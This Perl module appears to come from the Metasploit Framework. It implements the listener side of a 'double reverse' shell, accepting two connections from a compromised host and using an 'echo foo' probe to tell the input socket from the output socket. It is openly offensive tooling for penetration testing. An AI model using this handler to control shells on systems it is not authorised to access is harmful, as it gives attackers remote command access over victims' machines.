#!/usr/bin/perl

package Msf::PayloadComponent::DoubleReverseConnection;
use strict;
use base 'Msf::PayloadComponent::ReverseConnection';
use IO::Socket::INET;
use IO::Select;

sub CheckHandler {
  my $self = shift;
  return($self->NinjaCheckHandler) if($self->NinjaWanted);
  my $sock1;
  my $sock2;

  my @ready = $self->ListenerSelector->can_read(.5);
  if(@ready) {
    $sock1 = $ready[0]->accept();
    $self->PrintLine('[*] Recieved first connection.');
  }
  else {
    return(0);
  }

  # if we already saw one connection, wait for a while before giving up
  @ready = $self->ListenerSelector->can_read(10);
  if(@ready) {
    $sock2 = $ready[0]->accept();
    $self->PrintLine('[*] Recieved second connection.');

    $sock1->send("echo foo;\n");
    $sock2->send("echo foo;\n");
    
    my $selector = IO::Select->new($sock1, $sock2);
    @ready = $selector->can_read(2);
    if(!@ready) {
      $self->PrintLine('[*] Failed to determine which is in and which is out!');
      return(0);
    }

    my $data;
    $ready[0]->recv($data, 4096);

    if ($data =~ /foo/ && $ready[0] eq $sock1) 
    {
      $self->SocketIn($sock1);
      $self->SocketOut($sock2);
    } else {
      $self->SocketIn($sock2);
      $self->SocketOut($sock1);
    }

    return(1);
  }

  $self->PrintLine('[*] Failed to recieve second connection.');
  return(0);
}

sub NinjaCheckHandler {
  my $self = shift;
  my $dontKill = $self->GetVar('NinjaDontKill');

  my @ready = $self->NinjaSelector->can_read(.5);
  if(@ready) {
    my $data;
    $self->NinjaSock->recv($data, 4096);
    return if(!length($data));

    while($data =~ /Added server/g) {
      $self->PrintLine('[!] socketNinja has new connection.');
      $self->{'NinjaCount'}++;
      return(0) if($dontKill);
      return($self->{'NinjaCount'} >= 2);
    }
  }

  return(0);
}

1;
